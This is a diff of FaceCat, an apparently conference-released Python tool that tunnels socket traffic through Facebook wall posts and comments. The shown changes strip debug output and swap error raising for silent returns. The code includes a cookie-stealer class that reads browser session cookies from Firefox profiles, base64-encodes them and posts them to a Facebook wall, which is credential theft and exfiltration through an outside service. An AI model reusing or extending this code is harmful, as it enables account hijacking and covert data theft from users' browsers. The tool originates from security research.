@@ -4,9 +4,6 @@
 # Jose Selvi - jselvi[a.t]pentester[d0.t]es - http://www.pentester.es
 # Version 0.1 - 02/Oct/2011 - SOURCE Conferences
 
-# TODO:
-# http://www.imagemagick.org/Usage/canvas/
-
 from __future__ import print_function
 
 # Libraries
@@ -23,7 +20,7 @@ import zlib
 from optparse import OptionParser
 
 # FaceCat Class
-class FaceCat(object):
+class FaceCat:
     # Variable Definition
     _headers = {}
     _cookie = ""
@@ -62,15 +59,13 @@ class FaceCat(object):
         req = urllib2.Request( url=web, headers=self._headers )
         f = urllib2.urlopen(req)
         if not f:
-            raise ValueError('No connection')
+            return
         content = f.read()
         f.close()
-        with open('get_my_name.html', 'w') as file:
-            file.write(content)
         # Find the link
         m = re.search( '<title>.*</title>', content )
         if not m:
-            raise ValueError('Match not found')
+            return
         link = m.group(0)
         # Split content
         aux = re.split( '>', link )[1]
@@ -78,7 +73,7 @@ class FaceCat(object):
         # Find share link
         m = re.search( 'composer_form\" action.*</form>', content )
         if not m:
-            raise ValueError('Match not found')
+            return
         form = m.group(0)
         # Split content
         vform = re.split( '"', form )
@@ -93,11 +88,9 @@ class FaceCat(object):
         req = urllib2.Request( url=web, headers=self._headers )
         f = urllib2.urlopen(req)
         if not f:
-            raise ValueError('No connection')
+            return
         content = f.read()
         f.close()
-        with open('search_results_page.html', 'w') as file:
-            file.write(content)
         # Find the link
         m = re.search( '/profile.php\?id=\d+', content )
         if m:
@@ -122,12 +115,9 @@ class FaceCat(object):
     def _CreateWall( self ):
         if options.verbose:
             print(str(type(self))+'._CreateWall')
-        print(str(type(self)) + "._CreateWall")
         # We need to be the owner
-        if options.verbose:
-            print('fbid =', self._fbid)
         if self._fbid != 0:
-            raise ValueError('FBID != 0')
+            return
         # Create Post so I'm the master
         self._sender = "M"
         # Select Quote
@@ -136,8 +126,6 @@ class FaceCat(object):
         cookie = base64.b64encode( self._cookie )
         cookie = re.sub( '\+', '%2B', cookie )
         web = self._newpost_link
-        if options.verbose:
-            print('web =', web)
         data = self._newpost_data + "- " + quote + " - [" + cookie + "]"
         # Write Share
         if options.verbose:
@@ -157,21 +145,18 @@ class FaceCat(object):
         import re
         # We need to be the owner
         if self._fbid != 0:
-            raise ValueError('FBID != 0')
+            return
         # Get Post
         web = self._delete_link
-        print('web =', web)
         # Press delete button
         req = urllib2.Request( url=web, headers=self._headers )
         f = urllib2.urlopen(req)
         content = f.read()
         f.close()
-        with open('press_delete.html', 'w') as file:
-            file.write(content)
         # Search confirmation link
         m = re.search( '"/a/delete.php\?.*"', content )
         if not m:
-            raise ValueError('Match not found')
+            return
         delete = m.group(0)
         # Split the Delete Link
         deletelink = re.split( '"', delete )[1].replace("&amp;","&")
@@ -194,19 +179,12 @@ class FaceCat(object):
         req = urllib2.Request( url=web, headers=self._headers )
         f = urllib2.urlopen(req)
         if not f:
-            raise ValueError('No connection')
+            return
         content = f.read()
         f.close()
-        with open('get_wall_posts.html', 'w') as file:
-            file.write(content)
         # Search "Comments", "See More" or Cookie
-        m1 = re.search( '"/story.php\?story_fbid=.*?"', content )
+        m1 = re.search( '"/story.php\?story_fbid=.*"', content )
         m2 = re.search( '</strong></a>.*[a-zA-Z0-9+/=]+\]', content )
-        if options.verbose:
-            if m1:
-                print('m1 =', m1.group(0))
-            if m2:
-                print('m2 =', m2.group(0))
         # None of them? No post
         if not m1 and not m2:
             # No post? Create One
@@ -214,23 +192,17 @@ class FaceCat(object):
         # "Comments" or "See More"
         if m1:
             # Get new URL
-            if options.verbose:
-                print('[+] get new url')
             post = m1.group(0)
             postlink = re.split( '"', post )[1].replace("&amp;","&")
             auxweb = "http://m.facebook.com" + postlink
             req = urllib2.Request( url=auxweb, headers=self._headers )
             f = urllib2.urlopen(req)
             if not f:
-                raise ValueError('No connection')
+                return
             content = f.read()
             f.close()
-            with open('get_new_url.html', 'w') as file:
-                file.write(content)
         # Cookie
         if m1 or m2:
-            if options.verbose:
-                print('[+] cookie')
             # Remove HTML Tags
             content = re.sub( '<[a-zA-Z \"\'=/_?]+>', '', content )
             content = re.sub( ' ', '', content )
@@ -238,8 +210,7 @@ class FaceCat(object):
             m = re.search( '-\[[a-zA-Z0-9+/=]+\]', content )
             if not m:
                 # No? Sure? Error!
-                print('[-] didn\'t find cookie...')
-                raise ValueError('Match Not Found')
+                return
             # Decode Cookie
             aux = re.split( '\[', m.group(0) )[1]
             cookie64 = re.split( '\]', aux )[0]
@@ -253,25 +224,22 @@ class FaceCat(object):
         req = urllib2.Request( url=web, headers=self._headers )
         f = urllib2.urlopen(req)
         if not f:
-            raise ValueError('No connection')
+            return
         content = f.read()
         f.close()
-        with open('get_wall_new_cookie.html', 'w') as file:
-            file.write(content)
         # Find the post
         m = re.search( '"/story.php\?story_fbid=.*"', content )
         if not m:
             # No? Sure? Error!
-            raise ValueError('Match not found')
+            return
         post = m.group(0)
         # Split the Post Link
         postlink = re.split( '"', post )[1].replace("&amp;","&")
-        print('pipe_link set')
         self._pipe_link = "http://m.facebook.com" + postlink
         # Find the Delete link
         m = re.search( '"/delete.php\?.*"', content )
         if not m:
-            raise ValueError('Match not found')
+            return
         delete = m.group(0)
         # Split the Delete Link
         deletelink = re.split( '"', delete )[1].replace("&amp;","&")
@@ -282,8 +250,6 @@ class FaceCat(object):
         f = urllib2.urlopen(req)
         content = f.read()
         f.close()
-        with open('go_to_comment.html', 'w') as file:
-            file.write(content)
         # Find the write comment script
         m = re.search( '<form .*</form>', content )
         form = m.group(0)
@@ -293,7 +259,6 @@ class FaceCat(object):
         form_fb_dtsg = vform[11]
         form_post_form_id = vform[19]
         # Store & Return
-        print('pipe_link set')
         self._pipe_link = "http://m.facebook.com" + postlink
         self._pipe_wlink = "http://m.facebook.com" + form_action
         self._pipe_wdata = "id="+form_id+"&fb_dtsg="+form_fb_dtsg+"&post_form_id="+form_post_form_id+"&comment_text="
@@ -341,13 +306,10 @@ class FaceCat(object):
             print(str(type(self))+'.read')
         # Read Comments Page
         web = self._pipe_link
-        print('web =', web)
         req = urllib2.Request( url=web, headers=self._headers )
         f = urllib2.urlopen(req)
         content = f.read()
         f.close()
-        with open('read_comments_page.html', 'w') as file:
-            file.write(content)
         # Get Comments
         m = re.search( '<strong>.*</strong>.*<abbr>', content )
         posts = m.group(0)
@@ -430,11 +392,9 @@ class FaceCat(object):
         f = urllib2.urlopen(req)
         content = f.read()
         f.close()
-        with open('write_comment.html') as file:
-            file.write(content)
 
 # FaceBookCookieStealer Class
-class FaceBookCookieStealer(object):
+class FaceBookCookieStealer:
 
     #
     # By Browser
@@ -569,7 +529,7 @@ class FaceBookCookieStealer(object):
         if options.verbose:
             print(str(type(self))+'.get_firefox_linux_cookie')
         # COMMING SOON...
-        #return
+        # return
         # Libraries
         import os
         # Get Firefox Profiles
@@ -690,6 +650,8 @@ class FaceBookCookieStealer(object):
 ### Main
 ###
 
+print('[+] Entering Main')
+
 # Get Parameters
 usage = "usage: %prog [options]"
 parser = OptionParser(usage=usage)
@@ -699,6 +661,7 @@ parser.add_option("-p", "--port", type="int", dest="port", default=4444, help="l
 parser.add_option("-v", "--verbose", action="store_true", dest="verbose", default=False, help="verbose output")
 (options, args) = parser.parse_args()
 if not options.wall or not options.port:
+    print('[-] no wall OR no port')
     parser.print_help()
     exit()
 
@@ -720,7 +683,7 @@ try:
     fc = FaceCat()
     if not fc:
         print("Error creating FaceCat object!")
-        exit
+        exit()
 
     # Listen or Connect Socket
     res = socket.getaddrinfo( options.host, options.port, socket.AF_UNSPEC, socket.SOCK_STREAM, 0, socket.AI_PASSIVE)[0]
@@ -793,8 +756,9 @@ try:
 
 except KeyboardInterrupt:
     if options.verbose:
+        print('[-] Caught KeyboardInterrupt')
         print("Closing FaceCat Script")
-    exit
+    exit()
 
 except Exception as e:
     if options.verbose:
